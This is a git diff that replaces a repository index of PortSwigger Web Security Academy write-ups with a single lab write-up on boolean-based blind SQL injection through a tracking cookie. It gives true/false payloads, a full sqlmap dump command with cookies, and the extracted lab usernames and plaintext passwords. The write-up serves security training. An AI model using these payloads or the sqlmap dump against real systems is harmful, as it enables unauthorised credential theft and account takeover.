@@ -1,854 +1,426 @@
-<div align="center">
+# Blind SQL Injection with Conditional Responses
 
-[![Platform](https://img.shields.io/badge/Platform-PortSwigger%20Web%20Security%20Academy-orange?style=flat-square)](https://portswigger.net/web-security)
-[![Labs Completed](https://img.shields.io/badge/Completed-11%2F263-brightgreen?style=flat-square)](https://github.com/anim-michael-asante/portswigger-web-security-writeups)
-[![Topics](https://img.shields.io/badge/Topics-31-purple?style=flat-square)](https://portswigger.net/web-security/all-topics)
-[![OWASP](https://img.shields.io/badge/Standard-OWASP%20Top%2010%202021-red?style=flat-square)](https://owasp.org/Top10/)
-[![MITRE](https://img.shields.io/badge/Framework-MITRE%20ATT%26CK-black?style=flat-square)](https://attack.mitre.org/)
-[![License](https://img.shields.io/badge/License-MIT-blue?style=flat-square)](LICENSE)
-[![Author](https://img.shields.io/badge/Author-0x1aerixis-black?style=flat-square)](https://github.com/anim-michael-asante)
+> Boolean-based blind SQL injection via a tracking cookie, exploited to extract plaintext credentials from a PostgreSQL backend and achieve administrative account takeover on PortSwigger Web Security Academy.
 
-# PortSwigger Web Security Academy — Write-Ups
-
-_Structured, evidence-driven write-ups for every lab across 31 web security topic areas._
-
-[Browse Write-Ups](#server-side-topics) · [Track Progress](#progress-tracker) · [View Standards](#standards-and-frameworks)
-
-</div>
+![Status](https://img.shields.io/badge/Status-Complete-brightgreen)
+![Type](https://img.shields.io/badge/Type-CTF--Writeup-blue)
+![Platform](https://img.shields.io/badge/Platform-PortSwigger_Web_Security_Academy-orange)
+![Difficulty](https://img.shields.io/badge/Difficulty-Practitioner-orange)
+![Author](https://img.shields.io/badge/Author-0x1aerixis-black)
+![DBMS](https://img.shields.io/badge/DBMS-PostgreSQL-336791?logo=postgresql)
+![CVSS](https://img.shields.io/badge/CVSS_v3.1-7.5_HIGH-red)
 
 ---
 
 ## Table of Contents
 
 - [Overview](#overview)
-- [Why This Repository](#why-this-repository)
-- [Progress Tracker](#progress-tracker)
-- [Repository Structure](#repository-structure)
-- [Server-Side Topics](#server-side-topics)
-  - [01. SQL Injection](#01-sql-injection--18-labs)
-  - [02. Authentication](#02-authentication--14-labs)
-  - [03. Path Traversal](#03-path-traversal--6-labs)
-  - [04. OS Command Injection](#04-os-command-injection--5-labs)
-  - [05. Business Logic Vulnerabilities](#05-business-logic-vulnerabilities--11-labs)
-  - [06. Information Disclosure](#06-information-disclosure--5-labs)
-  - [07. Access Control Vulnerabilities](#07-access-control-vulnerabilities--13-labs)
-  - [08. File Upload Vulnerabilities](#08-file-upload-vulnerabilities--7-labs)
-  - [09. Race Conditions](#09-race-conditions--6-labs)
-  - [10. SSRF](#10-server-side-request-forgery-ssrf--7-labs)
-  - [11. XXE Injection](#11-xml-external-entity-xxe-injection--9-labs)
-  - [12. NoSQL Injection](#12-nosql-injection--4-labs)
-  - [13. API Testing](#13-api-testing--5-labs)
-  - [14. Web Cache Deception](#14-web-cache-deception--5-labs)
-- [Client-Side Topics](#client-side-topics)
-  - [15. Cross-Site Scripting (XSS)](#15-cross-site-scripting-xss--30-labs)
-  - [16. CSRF](#16-cross-site-request-forgery-csrf--12-labs)
-  - [17. CORS](#17-cross-origin-resource-sharing-cors--3-labs)
-  - [18. Clickjacking](#18-clickjacking--5-labs)
-  - [19. DOM-Based Vulnerabilities](#19-dom-based-vulnerabilities--7-labs)
-  - [20. WebSockets](#20-websockets--3-labs)
-- [Advanced Topics](#advanced-topics)
-  - [21. Insecure Deserialization](#21-insecure-deserialization--10-labs)
-  - [22. Web LLM Attacks](#22-web-llm-attacks--7-labs)
-  - [23. GraphQL API Vulnerabilities](#23-graphql-api-vulnerabilities--5-labs)
-  - [24. Server-Side Template Injection](#24-server-side-template-injection--7-labs)
-  - [25. Web Cache Poisoning](#25-web-cache-poisoning--13-labs)
-  - [26. HTTP Host Header Attacks](#26-http-host-header-attacks--7-labs)
-  - [27. HTTP Request Smuggling](#27-http-request-smuggling--22-labs)
-  - [28. OAuth Authentication](#28-oauth-authentication--6-labs)
-  - [29. JWT Attacks](#29-jwt-attacks--8-labs)
-  - [30. Prototype Pollution](#30-prototype-pollution--10-labs)
-  - [31. Essential Skills](#31-essential-skills--2-labs)
-- [Standards and Frameworks](#standards-and-frameworks)
-- [Tools and Environment](#tools-and-environment)
+- [Scope & Objectives](#scope--objectives)
+- [Methodology](#methodology)
+- [Findings / Results](#findings--results)
+- [Risk Summary](#risk-summary)
+- [Attack Chain](#attack-chain)
+- [Tools & Environment](#tools--environment)
+- [Evidence](#evidence)
+- [Remediation](#remediation)
+- [Lessons Learned](#lessons-learned)
+- [References](#references)
 - [Author](#author)
 
 ---
 
 ## Overview
 
-This repository documents hands-on exploitation of real-world web vulnerability classes through the [PortSwigger Web Security Academy](https://portswigger.net/web-security) — 263 labs across 31 topic areas spanning server-side, client-side, and advanced attack techniques.
+Web applications that embed unsanitized user-supplied input into SQL queries — even when those queries return no visible output — remain vulnerable to data extraction through inference-based techniques. Blind SQL injection exploits the application's conditional behavior to reconstruct sensitive data one bit at a time, bypassing the assumption that invisible query results are unexploitable.
 
-Each write-up follows an industry-standard penetration testing report format: scope, methodology, technical findings with CVSS v3.1 scoring, proof-of-concept, and remediation strategy. The repository is organised by vulnerability category, with each lab in its own subdirectory containing a `README.md` and an `evidence/` folder.
+This writeup documents the exploitation of a blind SQL injection vulnerability in a tracking cookie parameter on PortSwigger Web Security Academy. A boolean-based inference technique was applied against a PostgreSQL backend to enumerate the `users` table and recover plaintext credentials for the `administrator` account.
 
-Coverage spans the full OWASP Top 10 (2021) and maps findings to MITRE ATT&CK, CWE, and NIST SP 800-115 throughout.
+The lab was solved by logging in as `administrator`, confirming full credential compromise via a non-destructive, read-only attack chain.
 
----
-
-## Why This Repository
-
-The PortSwigger Web Security Academy is the closest freely available proxy for real-world web application penetration testing. Labs are built on production-representative frameworks with genuine vulnerability chains — not toy examples.
-
-This repository exists for three reasons:
-
-1. **Portfolio evidence.** Each write-up is structured as a deliverable a junior pentester would produce for a client — scope, methodology, findings, CVSS score, PoC, remediation. Recruiters and hiring managers can read any write-up and evaluate both technical depth and communication quality.
-
-2. **BSCP preparation.** The Burp Suite Certified Practitioner exam requires timed, unaided exploitation across the same 31 topic areas. This repository builds the muscle memory and structured thinking required to pass under exam conditions.
-
-3. **Structured learning.** Writing forces full understanding. A lab is not complete until the exploitation steps, root cause, CWE, and remediation can be explained in writing without referencing the solution.
+> **Key Outcome:** Full credential dump of three user accounts (including `administrator`) extracted from a PostgreSQL `users` table via boolean-based blind SQL injection in the `TrackingId` cookie parameter, resulting in authenticated account takeover.
 
 ---
 
-## Progress Tracker
+## Scope & Objectives
 
-| #   | Category                                                               | Difficulty Range          | Labs    | Completed | Status                                                                   |
-| --- | ---------------------------------------------------------------------- | ------------------------- | ------- | --------- | ------------------------------------------------------------------------ |
-| 01  | [SQL Injection](#01-sql-injection--18-labs)                            | Apprentice — Practitioner | 18      | 11        | ![](https://img.shields.io/badge/11%2F18-brightgreen?style=flat-square)  |
-| 02  | [Authentication](#02-authentication--14-labs)                          | Apprentice — Expert       | 14      | 0         | ![](https://img.shields.io/badge/0%2F14-lightgrey?style=flat-square)     |
-| 03  | [Path Traversal](#03-path-traversal--6-labs)                           | Apprentice — Practitioner | 6       | 0         | ![](https://img.shields.io/badge/0%2F6-lightgrey?style=flat-square)      |
-| 04  | [OS Command Injection](#04-os-command-injection--5-labs)               | Apprentice — Practitioner | 5       | 0         | ![](https://img.shields.io/badge/0%2F5-lightgrey?style=flat-square)      |
-| 05  | [Business Logic](#05-business-logic-vulnerabilities--11-labs)          | Apprentice — Expert       | 11      | 0         | ![](https://img.shields.io/badge/0%2F11-lightgrey?style=flat-square)     |
-| 06  | [Information Disclosure](#06-information-disclosure--5-labs)           | Apprentice — Practitioner | 5       | 0         | ![](https://img.shields.io/badge/0%2F5-lightgrey?style=flat-square)      |
-| 07  | [Access Control](#07-access-control-vulnerabilities--13-labs)          | Apprentice — Practitioner | 13      | 0         | ![](https://img.shields.io/badge/0%2F13-lightgrey?style=flat-square)     |
-| 08  | [File Upload](#08-file-upload-vulnerabilities--7-labs)                 | Apprentice — Expert       | 7       | 0         | ![](https://img.shields.io/badge/0%2F7-lightgrey?style=flat-square)      |
-| 09  | [Race Conditions](#09-race-conditions--6-labs)                         | Apprentice — Expert       | 6       | 0         | ![](https://img.shields.io/badge/0%2F6-lightgrey?style=flat-square)      |
-| 10  | [SSRF](#10-server-side-request-forgery-ssrf--7-labs)                   | Apprentice — Expert       | 7       | 0         | ![](https://img.shields.io/badge/0%2F7-lightgrey?style=flat-square)      |
-| 11  | [XXE Injection](#11-xml-external-entity-xxe-injection--9-labs)         | Apprentice — Expert       | 9       | 0         | ![](https://img.shields.io/badge/0%2F9-lightgrey?style=flat-square)      |
-| 12  | [NoSQL Injection](#12-nosql-injection--4-labs)                         | Apprentice — Practitioner | 4       | 0         | ![](https://img.shields.io/badge/0%2F4-lightgrey?style=flat-square)      |
-| 13  | [API Testing](#13-api-testing--5-labs)                                 | Apprentice — Practitioner | 5       | 0         | ![](https://img.shields.io/badge/0%2F5-lightgrey?style=flat-square)      |
-| 14  | [Web Cache Deception](#14-web-cache-deception--5-labs)                 | Apprentice — Expert       | 5       | 0         | ![](https://img.shields.io/badge/0%2F5-lightgrey?style=flat-square)      |
-| 15  | [Cross-Site Scripting](#15-cross-site-scripting-xss--30-labs)          | Apprentice — Expert       | 30      | 0         | ![](https://img.shields.io/badge/0%2F30-lightgrey?style=flat-square)     |
-| 16  | [CSRF](#16-cross-site-request-forgery-csrf--12-labs)                   | Apprentice — Expert       | 12      | 0         | ![](https://img.shields.io/badge/0%2F12-lightgrey?style=flat-square)     |
-| 17  | [CORS](#17-cross-origin-resource-sharing-cors--3-labs)                 | Apprentice — Practitioner | 3       | 0         | ![](https://img.shields.io/badge/0%2F3-lightgrey?style=flat-square)      |
-| 18  | [Clickjacking](#18-clickjacking--5-labs)                               | Apprentice — Practitioner | 5       | 0         | ![](https://img.shields.io/badge/0%2F5-lightgrey?style=flat-square)      |
-| 19  | [DOM-Based Vulnerabilities](#19-dom-based-vulnerabilities--7-labs)     | Apprentice — Expert       | 7       | 0         | ![](https://img.shields.io/badge/0%2F7-lightgrey?style=flat-square)      |
-| 20  | [WebSockets](#20-websockets--3-labs)                                   | Apprentice — Practitioner | 3       | 0         | ![](https://img.shields.io/badge/0%2F3-lightgrey?style=flat-square)      |
-| 21  | [Insecure Deserialization](#21-insecure-deserialization--10-labs)      | Apprentice — Expert       | 10      | 0         | ![](https://img.shields.io/badge/0%2F10-lightgrey?style=flat-square)     |
-| 22  | [Web LLM Attacks](#22-web-llm-attacks--7-labs)                         | Apprentice — Practitioner | 7       | 0         | ![](https://img.shields.io/badge/0%2F7-lightgrey?style=flat-square)      |
-| 23  | [GraphQL API Vulnerabilities](#23-graphql-api-vulnerabilities--5-labs) | Apprentice — Practitioner | 5       | 0         | ![](https://img.shields.io/badge/0%2F5-lightgrey?style=flat-square)      |
-| 24  | [SSTI](#24-server-side-template-injection--7-labs)                     | Practitioner — Expert     | 7       | 0         | ![](https://img.shields.io/badge/0%2F7-lightgrey?style=flat-square)      |
-| 25  | [Web Cache Poisoning](#25-web-cache-poisoning--13-labs)                | Practitioner — Expert     | 13      | 0         | ![](https://img.shields.io/badge/0%2F13-lightgrey?style=flat-square)     |
-| 26  | [HTTP Host Header Attacks](#26-http-host-header-attacks--7-labs)       | Apprentice — Expert       | 7       | 0         | ![](https://img.shields.io/badge/0%2F7-lightgrey?style=flat-square)      |
-| 27  | [HTTP Request Smuggling](#27-http-request-smuggling--22-labs)          | Practitioner — Expert     | 22      | 0         | ![](https://img.shields.io/badge/0%2F22-lightgrey?style=flat-square)     |
-| 28  | [OAuth Authentication](#28-oauth-authentication--6-labs)               | Apprentice — Expert       | 6       | 0         | ![](https://img.shields.io/badge/0%2F6-lightgrey?style=flat-square)      |
-| 29  | [JWT Attacks](#29-jwt-attacks--8-labs)                                 | Apprentice — Expert       | 8       | 0         | ![](https://img.shields.io/badge/0%2F8-lightgrey?style=flat-square)      |
-| 30  | [Prototype Pollution](#30-prototype-pollution--10-labs)                | Apprentice — Expert       | 10      | 0         | ![](https://img.shields.io/badge/0%2F10-lightgrey?style=flat-square)     |
-| 31  | [Essential Skills](#31-essential-skills--2-labs)                       | Practitioner              | 2       | 0         | ![](https://img.shields.io/badge/0%2F2-lightgrey?style=flat-square)      |
-|     | **TOTAL**                                                              |                           | **263** | **11**    | ![](https://img.shields.io/badge/11%2F263-brightgreen?style=flat-square) |
+### Objectives
 
-> `[SOLVED]` — Write-up published &nbsp;·&nbsp; `[IN PROGRESS]` — Active &nbsp;·&nbsp; `[PENDING]` — Not started
+- Identify and confirm a blind SQL injection vulnerability in the `TrackingId` session cookie.
+- Determine the backend DBMS and enumerate the `public.users` table schema.
+- Extract plaintext credentials for the `administrator` account.
+- Authenticate as `administrator` to satisfy the lab completion condition.
+
+### In Scope
+
+| Target                                                      | Description                                                  | Type             |
+| ----------------------------------------------------------- | ------------------------------------------------------------ | ---------------- |
+| `0aa100ca0444ed198105fc1d009b00e7.web-security-academy.net` | PortSwigger lab instance                                     | Web Application  |
+| `/login` endpoint (POST)                                    | Authentication form accepting username and password          | HTTP Endpoint    |
+| `TrackingId` cookie                                         | Analytics cookie parameter injected into a backend SQL query | Cookie Parameter |
+| `public.users` table                                        | Target table containing `username` and `password` columns    | Database Object  |
+
+### Out of Scope
+
+- All other PortSwigger lab instances and user accounts not belonging to this session.
+- Any attempt to write to or modify the database (INSERT, UPDATE, DELETE, DROP).
+- Network-level attacks, denial-of-service, or infrastructure enumeration.
+
+### Engagement Type
+
+> **Type:** Gray-box (lab description disclosed the vulnerable parameter category and target table)
+> **Authorization:** PortSwigger Web Security Academy — fully sanctioned lab environment
+> **Duration:** Single session
 
 ---
 
-## Repository Structure
+## Methodology
+
+This assessment followed the OWASP Testing Guide v4.2 (OTG-INPVAL-005 — Testing for SQL Injection) combined with the PTES exploitation phase structure. MITRE ATT&CK was used post-exploitation for technique mapping.
+
+### Phase 1 — Reconnaissance and Traffic Capture
+
+Burp Suite Community Edition was configured as an intercepting proxy. A standard login attempt was submitted to populate the browser's session cookies. The intercepted POST request to `/login` revealed two cookies: `TrackingId` and `session`.
+
+The `TrackingId` cookie was identified as a candidate injection point based on the lab description's disclosure that an analytics query is performed against its value, and that the application conditionally renders a "Welcome back" message when the query returns at least one row.
+
+### Phase 2 — Injection Point Confirmation
+
+The captured HTTP request, including all headers and the full cookie string, was saved to a file and passed to `sqlmap` with the `--cookie` flag targeting the `TrackingId` parameter. The `--level` and `--risk` flags were elevated to ensure thorough testing of cookie parameters.
+
+`sqlmap` confirmed injection using a boolean-based blind technique:
 
 ```
-portswigger-web-security-writeups/
-├── README.md
-├── .gitignore
-│
-├── 01-sql-injection/
-│   ├── 01-where-clause-hidden-data/
-│   │   ├── README.md
-│   │   └── evidence/
-│   │       └── lab-solved.png
-│   ├── 02-sqli-login-bypass/
-│   │   ├── README.md
-│   │   └── evidence/
-│   │       ├── lab-solved-administrator.jpeg
-│   │       └── sqli-analysis-notes.jpeg
-│   ├── 03-sqli-union-oracle-version-disclosure/
-│   ├── 04-sqli-union-mysql-version-enum/
-│   ├── 05-sqli-union-db-enumeration/
-│   ├── 06-sqli-oracle-union-db-enumeration/
-│   ├── 07-sqli-union-column-count-null-probing/
-│   ├── 08-sqli-union-finding-a-column-containing-text/
-│   ├── 09-sqli-union-data-extraction/
-│   ├── 10-sqli-union-multiple-values-single-column/
-│   └── 11-sqli-blind-boolean-conditional-response-trackingid-cookie/
-│
-├── 02-authentication/
-├── 03-path-traversal/
-├── 04-os-command-injection/
-├── 05-business-logic/
-├── 06-information-disclosure/
-├── 07-access-control/
-├── 08-file-upload/
-├── 09-race-conditions/
-├── 10-ssrf/
-├── 11-xxe-injection/
-├── 12-nosql-injection/
-├── 13-api-testing/
-├── 14-web-cache-deception/
-├── 15-cross-site-scripting/
-├── 16-csrf/
-├── 17-cors/
-├── 18-clickjacking/
-├── 19-dom-based/
-├── 20-websockets/
-├── 21-insecure-deserialization/
-├── 22-web-llm-attacks/
-├── 23-graphql/
-├── 24-ssti/
-├── 25-web-cache-poisoning/
-├── 26-http-host-header/
-├── 27-http-request-smuggling/
-├── 28-oauth/
-├── 29-jwt/
-├── 30-prototype-pollution/
-└── 31-essential-skills/
+Type: boolean-based blind
+Title: AND boolean-based blind – WHERE or HAVING clause
+Payload: TrackingId=EEhrgu6COj4spjfV' AND 5261=5261 AND 'gywA'='gywA
 ```
 
-Each solved lab directory contains:
+The backend DBMS was fingerprinted as **PostgreSQL**.
+
+### Phase 3 — Data Extraction
+
+With injection confirmed, `sqlmap` was directed to dump the `users` table in the `public` schema. The tool iteratively inferred each character of the target columns (`username`, `password`) using boolean conditions against the application's conditional response behavior.
+
+```bash
+sqlmap -u "https://0aa100ca0444ed198105fc1d009b00e7.web-security-academy.net/" \
+  --cookie "TrackingId=EEhrgu6COj4spjfV; session=IfELFnG0xJj03LRVdNkUD1FdDbUY2kBO" \
+  -p TrackingId \
+  --dbms=postgresql \
+  --dump \
+  -T users \
+  -D public \
+  --batch
+```
+
+### Phase 4 — Authentication and Objective Completion
+
+The recovered `administrator` credentials were submitted to the `/login` endpoint. Successful authentication redirected to `/my-account?id=administrator`, and the lab status updated to "Solved."
+
+### Framework Alignment
+
+| Phase                          | Framework Reference                       |
+| ------------------------------ | ----------------------------------------- |
+| Injection point identification | OWASP Testing Guide v4.2 — OTG-INPVAL-005 |
+| Exploitation                   | PTES — Exploitation Phase                 |
+| Technique classification       | MITRE ATT&CK — T1190, T1552.001           |
+| Vulnerability classification   | CWE-89, OWASP A03:2021                    |
+
+---
+
+## Findings / Results
+
+### Finding F-01 — Boolean-Based Blind SQL Injection in TrackingId Cookie
+
+---
+
+**ID:** F-01
+**Severity:** `[HIGH]`
+**CVSS v3.1 Score:** 7.5
+**CVSS v3.1 Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`
+**CWE:** CWE-89 — Improper Neutralization of Special Elements used in an SQL Command
+**OWASP Category:** A03:2021 — Injection
+**MITRE ATT&CK TTPs:**
+
+- T1190 — Exploit Public-Facing Application
+- T1552.001 — Unsecured Credentials: Credentials In Files (post-extraction, CSV dump)
+
+**Affected Component:** `TrackingId` cookie parameter — analytics SQL query (backend, PostgreSQL)
+
+---
+
+#### Description
+
+The application constructs a SQL query using the raw value of the `TrackingId` cookie without input sanitization or parameterization. The query result is not returned to the client; however, the application conditionally renders a "Welcome back" string when the query returns one or more rows. This differential response constitutes an oracle that allows an attacker to infer the truth value of arbitrary SQL subqueries, enabling full data extraction via character-by-character enumeration.
+
+No authentication is required to send a modified cookie value. The vulnerability is exploitable from any network position with HTTP access to the application.
+
+---
+
+#### Technical Impact
+
+- Full read access to all data in the `public` schema of the PostgreSQL database.
+- Confirmed extraction of all records from the `users` table, including plaintext `username` and `password` values for three accounts: `administrator`, `carlos`, and `wiener`.
+- Backend DBMS version and schema structure disclosed through automated enumeration.
+
+#### Business Impact
+
+- Complete compromise of all user account credentials stored in the database.
+- Successful authentication as `administrator` grants full application-level privilege, including access to any administrative functions or privileged data.
+- No authentication barrier existed at the injection point — any unauthenticated external actor could replicate this attack against a live deployment.
+
+---
+
+#### Proof of Concept
+
+**Step 1 — Capture the base request**
+
+Intercept the POST request to `/login` using Burp Suite. The `TrackingId` cookie is present in the request headers.
 
 ```
-<lab-slug>/
-├── README.md       ← Write-up: scope, methodology, findings, CVSS, PoC, remediation
-└── evidence/       ← Screenshots and terminal output confirming lab completion
+Cookie: TrackingId=EEhrgu6COj4spjfV; session=IfELFnG0xJj03LRVdNkUD1FdDbUY2kBO
+```
+
+**Step 2 — Confirm injection**
+
+Append a boolean condition to the `TrackingId` value. A true condition returns the "Welcome back" string; a false condition suppresses it.
+
+```sql
+-- True condition (response includes "Welcome back")
+TrackingId=EEhrgu6COj4spjfV' AND '1'='1
+
+-- False condition (response omits "Welcome back")
+TrackingId=EEhrgu6COj4spjfV' AND '1'='2
+```
+
+**Step 3 — Automated extraction**
+
+```bash
+sqlmap -u "https://0aa100ca0444ed198105fc1d009b00e7.web-security-academy.net/" \
+  --cookie "TrackingId=EEhrgu6COj4spjfV; session=IfELFnG0xJj03LRVdNkUD1FdDbUY2kBO" \
+  -p TrackingId \
+  --dbms=postgresql \
+  --dump \
+  -T users \
+  -D public \
+  --batch
+```
+
+**Extracted data:**
+
+```
+Database: public
+Table: users
+[3 entries]
+
++---------------+----------------------+
+| username      | password             |
++---------------+----------------------+
+| administrator | ju5sl7dscs68gdmwsniv |
+| carlos        | ma7h4hemznvfoaouqbbc |
+| wiener        | tu8vv6er68n1hohv7v3t |
++---------------+----------------------+
 ```
 
 ---
 
-## Server-Side Topics
+#### Reproduction Steps
+
+1. Configure Burp Suite as an intercepting proxy.
+2. Navigate to the target application and submit any login attempt to populate session cookies.
+3. Capture the POST `/login` request and note the `TrackingId` cookie value.
+4. Save the raw request to a file (e.g., `request.txt`).
+5. Execute the `sqlmap` command above using the captured `TrackingId` value.
+6. Confirm DBMS as PostgreSQL and allow `sqlmap` to dump the `users` table.
+7. Use the extracted `administrator` credentials to log in at `/login`.
 
 ---
 
-### 01. SQL Injection — 18 Labs
+## Risk Summary
 
-SQL injection enables attackers to interfere with database queries, retrieve hidden data, bypass authentication, and in some configurations execute OS-level commands.
-
-**OWASP A03:2021** · **CWE-89** · **MITRE ATT&CK T1190**
-
-| #   | Lab Title                                                                           | Difficulty   | Status      | Write-Up                                                                                                                                                          |
-| --- | ----------------------------------------------------------------------------------- | ------------ | ----------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| 01  | SQL injection vulnerability in WHERE clause allowing retrieval of hidden data       | Apprentice   | `[SOLVED]`  | [View](https://github.com/anim-michael-asante/portswigger-web-security-writeups/blob/main/sql-injection/01-sqli-where-clause/README.md)                           |
-| 02  | SQL injection vulnerability allowing login bypass                                   | Apprentice   | `[SOLVED]`  | [View](https://github.com/anim-michael-asante/portswigger-web-security-writeups/blob/main/sql-injection/02-sqli-login-bypass/README.md)                           |
-| 03  | SQL injection attack, querying the database type and version on Oracle              | Practitioner | `[SOLVED]`  | [View](https://github.com/anim-michael-asante/portswigger-web-security-writeups/blob/main/sql-injection/03-sqli-union-oracle-version-disclosure/README.md)        |
-| 04  | SQL injection attack, querying the database type and version on MySQL and Microsoft | Practitioner | `[SOLVED]`  | [View](https://github.com/anim-michael-asante/portswigger-web-security-writeups/blob/main/sql-injection/04-sqli-union-mysql-version-enum/README.md)               |
-| 05  | SQL injection attack, listing the database contents on non-Oracle databases         | Practitioner | `[SOLVED]`  | [View](https://github.com/anim-michael-asante/portswigger-web-security-writeups/blob/main/sql-injection/05-sqli-union-db-enumeration/README.md)                   |
-| 06  | SQL injection attack, listing the database contents on Oracle                       | Practitioner | `[SOLVED]`  | [View](https://github.com/anim-michael-asante/portswigger-web-security-writeups/blob/main/sql-injection/06-sqli-oracle-union-db-enumeration/README.md)            |
-| 07  | SQL injection UNION attack, determining the number of columns returned by the query | Practitioner | `[SOLVED]`  | [View](https://github.com/anim-michael-asante/portswigger-web-security-writeups/blob/main/sql-injection/07-sqli-union-column-count-null-probing/README.md)        |
-| 08  | SQL injection UNION attack, finding a column containing text                        | Practitioner | `[SOLVED]`  | [View](https://github.com/anim-michael-asante/portswigger-web-security-writeups/blob/main/sql-injection/08-sqli-union-finding-a-column-containing-text/README.md) |
-| 09  | SQL injection UNION attack, retrieving data from other tables                       | Practitioner | `[SOLVED]`  | [View](https://github.com/anim-michael-asante/portswigger-web-security-writeups/tree/main/sql-injection/09-sqli-union-data-extraction/README.md)                  |
-| 10  | SQL injection UNION attack, retrieving multiple values in a single column           | Practitioner | `[SOLVED]`  | [View](https://github.com/anim-michael-asante/portswigger-web-security-writeups/blob/main/sql-injection/10-sqli-union-multiple-values-single-column/README.md)    |
-| 11  | Blind SQL injection with conditional responses                                      | Practitioner | `[SOLVED]`  | [View](https://github.com/anim-michael-asante/portswigger-web-security-writeups/blob/main/sql-injection/README.md)                                                |
-| 12  | Blind SQL injection with conditional errors                                         | Practitioner | `[PENDING]` | —                                                                                                                                                                 |
-| 13  | Visible error-based SQL injection                                                   | Practitioner | `[PENDING]` | —                                                                                                                                                                 |
-| 14  | Blind SQL injection with time delays                                                | Practitioner | `[PENDING]` | —                                                                                                                                                                 |
-| 15  | Blind SQL injection with time delays and information retrieval                      | Practitioner | `[PENDING]` | —                                                                                                                                                                 |
-| 16  | Blind SQL injection with out-of-band interaction                                    | Practitioner | `[PENDING]` | —                                                                                                                                                                 |
-| 17  | Blind SQL injection with out-of-band data exfiltration                              | Practitioner | `[PENDING]` | —                                                                                                                                                                 |
-| 18  | SQL injection with filter bypass via XML encoding                                   | Practitioner | `[PENDING]` | —                                                                                                                                                                 |
+| ID   | Finding                                                | Severity | CVSS | Affected Component                    | Priority      |
+| ---- | ------------------------------------------------------ | -------- | ---- | ------------------------------------- | ------------- |
+| F-01 | Boolean-Based Blind SQL Injection in TrackingId Cookie | `[HIGH]` | 7.5  | `TrackingId` cookie — analytics query | `[IMMEDIATE]` |
 
 ---
 
-### 02. Authentication — 14 Labs
+## Attack Chain
 
-Authentication vulnerabilities allow attackers to bypass login controls, enumerate valid usernames, brute-force credentials, and hijack sessions through flawed multi-factor logic.
+```
+[Unauthenticated Attacker]
+        |
+        | 1. HTTP request with modified TrackingId cookie
+        v
+[Web Application — /login endpoint]
+        |
+        | 2. Unsanitized cookie value embedded in SQL query
+        v
+[PostgreSQL Backend — public schema]
+        |
+        | 3. Boolean inference via conditional "Welcome back" response
+        v
+[Character-by-character data extraction]
+        |
+        | 4. Full dump: users table (username, password — plaintext)
+        v
+[Credential use — POST /login with administrator:ju5sl7dscs68gdmwsniv]
+        |
+        | 5. Authenticated session as administrator
+        v
+[Account Takeover — /my-account?id=administrator]
+```
 
-**OWASP A07:2021** · **CWE-287** · **MITRE ATT&CK T1110**
+**MITRE ATT&CK Chain:**
 
-| #   | Lab Title                                                       | Difficulty   | Status      | Write-Up |
-| --- | --------------------------------------------------------------- | ------------ | ----------- | -------- |
-| 01  | Username enumeration via different responses                    | Apprentice   | `[PENDING]` | —        |
-| 02  | 2FA simple bypass                                               | Apprentice   | `[PENDING]` | —        |
-| 03  | Password reset broken logic                                     | Apprentice   | `[PENDING]` | —        |
-| 04  | Username enumeration via subtly different responses             | Practitioner | `[PENDING]` | —        |
-| 05  | Username enumeration via response timing                        | Practitioner | `[PENDING]` | —        |
-| 06  | Broken brute-force protection, IP block                         | Practitioner | `[PENDING]` | —        |
-| 07  | Username enumeration via account lock                           | Practitioner | `[PENDING]` | —        |
-| 08  | 2FA broken logic                                                | Practitioner | `[PENDING]` | —        |
-| 09  | Brute-forcing a stay-logged-in cookie                           | Practitioner | `[PENDING]` | —        |
-| 10  | Offline password cracking                                       | Practitioner | `[PENDING]` | —        |
-| 11  | Password reset poisoning via middleware                         | Practitioner | `[PENDING]` | —        |
-| 12  | Password brute-force via password change                        | Practitioner | `[PENDING]` | —        |
-| 13  | Broken brute-force protection, multiple credentials per request | Expert       | `[PENDING]` | —        |
-| 14  | 2FA bypass using a brute-force attack                           | Expert       | `[PENDING]` | —        |
-
----
-
-### 03. Path Traversal — 6 Labs
-
-Path traversal allows attackers to read arbitrary files on the server filesystem, including credentials, configuration files, and application source code, by manipulating file path parameters.
-
-**OWASP A01:2021** · **CWE-22** · **MITRE ATT&CK T1083**
-
-| #   | Lab Title                                                                     | Difficulty   | Status      | Write-Up |
-| --- | ----------------------------------------------------------------------------- | ------------ | ----------- | -------- |
-| 01  | File path traversal, simple case                                              | Apprentice   | `[PENDING]` | —        |
-| 02  | File path traversal, traversal sequences blocked with absolute path bypass    | Practitioner | `[PENDING]` | —        |
-| 03  | File path traversal, traversal sequences stripped non-recursively             | Practitioner | `[PENDING]` | —        |
-| 04  | File path traversal, traversal sequences stripped with superfluous URL-decode | Practitioner | `[PENDING]` | —        |
-| 05  | File path traversal, validation of start of path                              | Practitioner | `[PENDING]` | —        |
-| 06  | File path traversal, validation of file extension with null byte bypass       | Practitioner | `[PENDING]` | —        |
+| Step | Tactic               | Technique                                           | ID        |
+| ---- | -------------------- | --------------------------------------------------- | --------- |
+| 1    | Initial Access       | Exploit Public-Facing Application                   | T1190     |
+| 2    | Collection           | Data from Information Repositories (DB enumeration) | T1213     |
+| 3    | Credential Access    | Unsecured Credentials                               | T1552.001 |
+| 4    | Privilege Escalation | Valid Accounts (administrator login)                | T1078     |
 
 ---
 
-### 04. OS Command Injection — 5 Labs
+## Tools & Environment
 
-OS command injection enables arbitrary system command execution on the host server, typically resulting in full system compromise, data exfiltration, or lateral movement.
+| Tool                             | Version               | Purpose                                            |
+| -------------------------------- | --------------------- | -------------------------------------------------- |
+| Burp Suite Community Edition     | v2026.3.2             | HTTP proxy, request interception, cookie capture   |
+| SQLMap                           | Latest (Kali rolling) | Automated blind SQL injection and data extraction  |
+| Kali Linux                       | Rolling release       | Attacker operating environment                     |
+| Firefox (Kali)                   | Chromium 146          | Browser for lab interaction and login verification |
+| PortSwigger Web Security Academy | —                     | Authorized lab platform                            |
 
-**OWASP A03:2021** · **CWE-78** · **MITRE ATT&CK T1059**
+**Target Environment:**
 
-| #   | Lab Title                                                     | Difficulty   | Status      | Write-Up |
-| --- | ------------------------------------------------------------- | ------------ | ----------- | -------- |
-| 01  | OS command injection, simple case                             | Apprentice   | `[PENDING]` | —        |
-| 02  | Blind OS command injection with time delays                   | Practitioner | `[PENDING]` | —        |
-| 03  | Blind OS command injection with output redirection            | Practitioner | `[PENDING]` | —        |
